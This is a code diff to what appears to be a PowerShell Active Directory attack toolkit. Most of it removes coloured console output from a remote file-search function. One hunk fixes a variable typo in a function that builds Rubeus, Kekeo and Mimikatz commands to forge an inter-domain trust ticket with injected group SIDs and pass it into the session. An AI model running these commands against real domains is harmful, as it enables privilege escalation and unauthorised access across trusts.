@@ -194,8 +194,7 @@ function Find-File {
         Invoke-Command -ComputerName $computerName -ScriptBlock {
                 Get-ChildItem -Path $Path -File -Recurse | 
                     Where-Object {$_.Name -match "$searchString"} -ErrorAction SilentlyContinue | 
-                        Select-Object Directory, Name | 
-                            Write-Host -ForegroundColor Green
+                        Select-Object Directory, Name
             }
     }
     
@@ -203,16 +202,14 @@ function Find-File {
     elseif ($Cifs){
         Get-ChildItem -Path "\\$computerName\$Path" -File -Recurse | 
             Where-Object {$_.Name -match "$searchString"} -ErrorAction SilentlyContinue | 
-                Select-Object Directory, Name | 
-                    Write-Host -ForegroundColor Green
+                Select-Object Directory, Name
     }
 
     # perform localhost query
     else {
         Get-ChildItem -Path $Path -File -Recurse | 
             Where-Object {$_.Name -match "$searchString"} -ErrorAction SilentlyContinue | 
-                Select-Object Directory, Name | 
-                    Write-Host -ForegroundColor Green
+                Select-Object Directory, Name 
     }
 }
 function Get-NestedGroupMembership {
@@ -338,7 +335,7 @@ function Get-TrustTicket{
     $kekeoTGS = "tgs::ask /tgt:$Outfile /service:$tgsService/$targetComputer"
 
     $rubeusTGT = "Rubeus.exe silver /sids:$TargetGroupSID /target:$targetDomain /rc4:$trustKey /sid:$SID /domain:$Domain /user:$User /service:$Service/$targetDomain /ldap /nowrap"
-    $rubeusTGS = "Rubeus.exe asktgs /ticket:B64_TGT /service:$tgsServie/$targetComputer /dc:$targetDC /nowrap /ptt"
+    $rubeusTGS = "Rubeus.exe asktgs /ticket:B64_TGT /service:$tgsService/$targetComputer /dc:$targetDC /nowrap /ptt"
 
     Write-Host `n"Printing: Mimikatz TGT command" `n -ForegroundColor Yellow 
     Write-Host $mimiTGT `n
